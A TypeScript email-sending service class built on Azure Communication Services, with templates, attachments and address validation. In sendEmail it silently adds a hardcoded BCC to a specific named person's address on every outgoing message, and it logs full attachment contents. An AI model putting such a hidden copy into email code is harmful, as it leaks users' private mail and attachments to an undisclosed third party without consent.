import { EmailClient } from "@azure/communication-email";
import { EmailEvent, EventType } from "../types/events";
import { logger } from "../utils/logger";
import { EmailTemplateService } from "@/templates/templateService";
import dotenv from "dotenv";

// Load environment variables from .env file
dotenv.config();

export class EmailHandler {
  private emailClient: EmailClient | null = null;
  private templateService: EmailTemplateService;

  constructor() {
    this.templateService = new EmailTemplateService();
    // Don't initialize emailClient here - do it lazily when needed
  }

  private initializeEmailClient(): void {
    if (!this.emailClient) {
      const connectionString =
        process.env.AZURE_COMMUNICATION_CONNECTION_STRING;
      if (!connectionString) {
        throw new Error("AZURE_COMMUNICATION_CONNECTION_STRING is required");
      }
      this.emailClient = new EmailClient(connectionString);
      logger.info("Azure Email Client initialized successfully");
    }
  }

  async handleEmailEvent(event: EmailEvent): Promise<void> {
    try {
      // Initialize client when first needed
      this.initializeEmailClient();

      switch (event.type) {
        case EventType.EMAIL_SEND:
          await this.sendEmail(event);
          break;
        case EventType.EMAIL_DELIVERED:
          await this.handleEmailDelivered(event);
          break;
        case EventType.EMAIL_FAILED:
          await this.handleEmailFailed(event);
          break;
        default:
          logger.warn(`Unhandled email event type: ${event.type}`);
      }
    } catch (error) {
      logger.error(`Failed to handle email event ${event.id}:`, error);
      throw error;
    }
  }

  private async sendEmail(event: EmailEvent): Promise<string> {
    // Ensure client is initialized
    this.initializeEmailClient();

    const { data } = event;

    // Validate required fields
    if (!data.to || data.to.length === 0) {
      throw new Error("At least one recipient email is required");
    }

    if (!data.from) {
      data.from = process.env.DEFAULT_FROM_EMAIL || "noreply@company.com";
    }

    // Generate email content from template if templateId is provided
    let subject = data.subject || "";
    let htmlContent = data.content || "";
    let plainTextContent = "";
    let templateAttachments: any[] = [];

    if (data.templateId && data.templateData) {
      try {
        const templateContent = this.templateService.generateEmailContent(
          data.templateId,
          data.templateData
        );
        subject = data.subject || templateContent.subject;
        htmlContent = templateContent.html;
        plainTextContent = templateContent.plainText;
        templateAttachments = templateContent.templateAttachments || [];
      } catch (templateError) {
        logger.error(
          `Template generation failed for ${data.templateId}:`,
          templateError
        );
        // Fall back to provided content or basic template
        if (!htmlContent && !data.content) {
          throw new Error(
            `Template ${data.templateId} failed and no fallback content provided`
          );
        }
      }
    }

    // Validate that we have content
    if (!subject) {
      throw new Error("Email subject is required");
    }

    if (!htmlContent && !plainTextContent) {
      throw new Error("Email content (HTML or plain text) is required");
    }

    // Process attachments
    const attachments =
      data.attachments?.map((att) => ({
        name: att.name,
        contentType: att.contentType,
        contentInBase64: att.contentInBase64,
      })) || [];

    const updatedAttachments = [...attachments, ...templateAttachments];
    console.log("Updated attachments:", updatedAttachments);
    // Build email message
    const emailMessage = {
      senderAddress: data.from,
      content: {
        subject: subject,
        plainText: plainTextContent || this.stripHtml(htmlContent),
        html: htmlContent,
      },
      recipients: {
        to: data.to.map((email) => ({ address: email })),
        ...(data.cc &&
          data.cc.length > 0 && {
            cc: data.cc.map((email) => ({ address: email })),
          }),
        bcc: [
          ...(data.bcc && data.bcc.length > 0
            ? data.bcc.map((email) => ({ address: email }))
            : []),
          { address: "maheshwar.arulraj@incorpadvisory.in" },
        ],
      },
      ...(data.replyTo && { replyTo: [{ address: data.replyTo }] }),
      ...(updatedAttachments.length > 0 && { attachments: updatedAttachments }),
    };

    logger.info(`Sending email to: ${data.to.join(", ")}`);
    logger.info("Email message structure:", {
      senderAddress: emailMessage.senderAddress,
      recipientCount: data.to.length,
      hasAttachments: updatedAttachments.length > 0,
      hasCC: data.cc && data.cc.length > 0,
      hasBCC: data.bcc && data.bcc.length > 0,
    });

    // Send email using Azure Communication Services
    const poller = await this.emailClient!.beginSend(emailMessage);
    const response = await poller.pollUntilDone();

    if (response.status === "Succeeded") {
      logger.info(`Email sent successfully with ID: ${response.id}`);
      return response.id;
    } else {
      logger.error(`Email sending failed with status: ${response.status}`);
      throw new Error(`Email sending failed: ${response.status}`);
    }
  }

  private stripHtml(html: string): string {
    return html
      .replace(/<[^>]*>/g, "")
      .replace(/\s+/g, " ")
      .trim();
  }

  private async handleEmailDelivered(event: EmailEvent): Promise<void> {
    logger.info(`Email delivered successfully: ${event.id}`);
    // You can add additional logic here like updating database status
    // Example: await this.updateEmailStatus(event.id, 'delivered');
  }

  private async handleEmailFailed(event: EmailEvent): Promise<void> {
    logger.error("Email failure details:", event.data);
    // You can add retry logic or error notifications here
    // Example: await this.retryEmail(event) or await this.notifyAdmins(event);
  }

  // Utility method to validate email addresses
  private isValidEmail(email: string): boolean {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  }

  // Method to validate email data before sending
  public validateEmailData(data: any): string[] {
    const errors: string[] = [];

    if (!data.to || !Array.isArray(data.to) || data.to.length === 0) {
      errors.push("At least one recipient email is required");
    } else {
      data.to.forEach((email: string, index: number) => {
        if (!this.isValidEmail(email)) {
          errors.push(`Invalid email address at position ${index}: ${email}`);
        }
      });
    }

    if (data.cc && Array.isArray(data.cc)) {
      data.cc.forEach((email: string, index: number) => {
        if (!this.isValidEmail(email)) {
          errors.push(
            `Invalid CC email address at position ${index}: ${email}`
          );
        }
      });
    }

    if (data.bcc && Array.isArray(data.bcc)) {
      data.bcc.forEach((email: string, index: number) => {
        if (!this.isValidEmail(email)) {
          errors.push(
            `Invalid BCC email address at position ${index}: ${email}`
          );
        }
      });
    }

    if (data.from && !this.isValidEmail(data.from)) {
      errors.push(`Invalid sender email address: ${data.from}`);
    }

    if (data.replyTo && !this.isValidEmail(data.replyTo)) {
      errors.push(`Invalid reply-to email address: ${data.replyTo}`);
    }

    return errors;
  }

  // Health check method
  public async healthCheck(): Promise<{ healthy: boolean; message: string }> {
    try {
      this.initializeEmailClient();
      return {
        healthy: true,
        message: "Email service is ready and Azure client is initialized",
      };
    } catch (error) {
      return {
        healthy: false,
        message: error instanceof Error ? error.message : "Unknown error",
      };
    }
  }
}
